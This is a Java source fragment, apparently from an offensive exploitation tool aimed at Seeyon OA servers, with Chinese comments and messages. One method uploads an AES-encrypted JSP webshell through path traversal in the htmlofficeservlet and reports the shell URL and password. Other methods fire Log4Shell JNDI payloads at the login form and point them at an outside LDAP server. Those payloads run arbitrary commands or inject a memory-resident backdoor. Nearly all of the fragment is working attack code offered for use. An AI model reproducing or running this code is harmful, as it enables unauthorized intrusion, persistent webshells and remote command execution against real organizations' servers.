        headers.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");

        String shellname ="..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\akka000000.jsp";
        String filename = CommonsUtils.EncodeBase64(shellname);
        String shellcontent = "<%! String xc=\"3c6e0b8a9c15224a\"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }}\n" +
                "%><%try{byte[] data=new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\", data);Object f=((Class)session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}\n" +
                "%>";

        int begin = 352 + String.valueOf(shellcontent.length()).length();
        String data ="DBSTEP V3.0     "+begin+"             0               "+shellcontent.length()+"             DBSTEP=OKMLlKlV\r\n" +
                "OPTION=S3WYOSWLBSGr\r\n" +
                "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n" +
                "CREATEDATE=wUghPB3szB3Xwg66\r\n" +
                "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n" +
                "originalFileId=wV66\r\n" +
                "originalCreateDate=wUghPB3szB3Xwg66\r\n" +
                "FILENAME="+filename+"\r\n" +
                "needReadFile=yRWZdAS6\r\n" +
                "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n" +
                shellcontent+"6e4f045d4b8506bf492ada7e3390d7ce";

        HashMap<String, Object> resp = HttpsUtils.sendPost(target, data, headers);
        try {
            Integer code = (Integer) resp.get("Code");
            if (code==200&&NetworkUtil.isOk(httpurl+"/seeyon/akka000000.jsp")){
                vulInfo.append("[+]存在SeeyonOA_Htmlofficeservlet_Rce漏洞!"+"\r\n[+]webshell:"+httpurl+"/seeyon/akka000000.jsp"+"\r\n"+"哥斯拉4.01 、加密器为JAVA_AES_RAW、秘钥为key、密码为pass\r\n");
            }else {
                vulInfo.append("[+]不存在SeeyonOA_Htmlofficeservlet_Rce漏洞|");
            }
        }catch (Exception e){
            e.printStackTrace();
        }


        return vulInfo;


    }


    public static StringBuilder SeeyonOA_log4j2_RCE_Check(String httpurl) throws Exception {

        StringBuilder vulInfo = new StringBuilder();
        vulInfo.append("----------------------------------------------------------\r\n");
        vulInfo.append("[+]检查SeeyonOA_log4j2_RCE_Check漏洞\r\n");
        /*请求dnslog*/
        String dnslog = DnslogDomain.getDnslog();
        String[] split = dnslog.split(";");
        String cookie = split[0];
        String ldapAdr = "ldap://"+split[1];

        /*调用漏洞攻击*/
        String target = CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/main.do?method=login");
        if(NetworkUtil.isOk(target)){
            vulInfo.append("[+]url:"+target+" 存在！"+ "\r\n");
            System.out.println("[+]url:"+target+" 存在！");
        }
        String data ="login_username=${jndi:"+ldapAdr+"}";
        HashMap<String, String> Headers = new HashMap<>();
        HttpsUtils.sendPost(target, data, Headers);


        /*检查是否存在漏洞，判断是否返回页面是否有dns记录*/
        if (DnslogDomain.checkDnslog(cookie,split[1])){
            vulInfo.append("[+]存在SeeyonOA_log4j2_RCE\r\n[+]前往JNDI_RCE利用\r\n");
            System.out.println("存在漏洞");
        }else {
            vulInfo.append("[-]不存在SeeyonOA_log4j2_RCE漏洞\r\n");
            System.out.println("不存在漏洞");
        }

        return vulInfo;

    }



    public static StringBuilder SeeyonOA_log4j2_RCE(String httpurl,String ldapAdr,String Command,String Encoding) throws Exception {
        StringBuilder vulInfo = new StringBuilder();
        String target = "";
        /*测试联通性*/
        if (NetworkUtil.isOk(httpurl)){
            target = CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/main.do?method=login");
            Map<String,String> Headers =new HashMap<String,String>();
            if(Command==null||Command.equals("")){
                Headers.put("cmd", "echo successExec");
                Command="echo successExec";
            }else {
                Headers.put("cmd", "echo successExec&&"+Command);
                Command="echo successExec||"+Command;

            }
            if(Encoding==null||Encoding.equals("")){
                Encoding="UTF-8";
            }


            HashMap<String, Object> testresp = HttpsUtils.sendPost(CommonsUtils.normizeUrl(httpurl) + CommonsUtils.normizePath("/seeyon/"), "type=basic&pass="+Command, new HashMap<String, String>(), Encoding);
            String respBody1 = (String) testresp.get("RespBody");
            /*判断是否有内存马*/
            if(!respBody1.contains("successExec")){
                /*没有内存马，执行对应回显的payload*/
                String data ="login_username=${jndi:"+ldapAdr+"}";
                HashMap<String, Object> resp = HttpsUtils.sendPost(target, data, Headers,Encoding);
                String respBody = (String) resp.get("RespBody");
                /*判断回显是否成功*/
                if (respBody.contains("successExec")){
                    vulInfo.append("[+]存在SeeyonOA_log4j2_RCE漏洞\r\n");
                    vulInfo.append("-------------------Command—Result-------------------\r\n");
                    vulInfo.append(respBody);
                    vulInfo.append("\r\n-------------------Command—Result-------------------\r\n\r\n");
                    System.out.println("[+]存在SeeyonOA_log4j2_RCE漏洞\r\n");
                    System.out.println(respBody);
                    return vulInfo;
                }else {
                    /*回显失败就判断是否为内存马利用，如果是就检验是否注入内存马成功*/
                    if(ldapAdr.contains("Memshell")){
                        if (NetworkUtil.isOk(CommonsUtils.normizeUrl(httpurl)+CommonsUtils.normizePath("/seeyon/?type=basic"))){
                            vulInfo.append("[+]成功写入，请检查"+httpurl+"/seeyon/?type=basic&pass=whoami");
                        }else {
                            vulInfo.append("[-]内存注入失败");
                        }

                    }else {
                        vulInfo.append("[-]此调用链利用错误" + "\r\n请尝试其他利用链，建议使用ldap://172.20.10.2:1389/TomcatBypass/TomcatMemshell1\r\n");
                        System.out.println("[-]此调用链利用错误");
                    }

                    return vulInfo;
                }
            }else {
                String cmdurl =CommonsUtils.normizeUrl(httpurl)+CommonsUtils.normizePath("/seeyon/");
                String data1 = "type=basic&pass=";

                HashMap<String, String> header1 = new HashMap<>();
                HashMap<String, Object> resp = HttpsUtils.sendPost(cmdurl, data1 + Command.replace("echo successExec||", ""), Headers);
                String respBody = (String) resp.get("RespBody");
                vulInfo.append(respBody);
                return vulInfo;
            }




        }else {
            vulInfo.append("[-]链接失败" + "\r\n[+]不存在SeeyonOA_Fastjson_ChangeLocale_Rce漏洞\r\n");
            System.out.println("[-]链接失败");
            return vulInfo;
        }
    }


    public static void main(String[] args) throws Exception {


    }
}
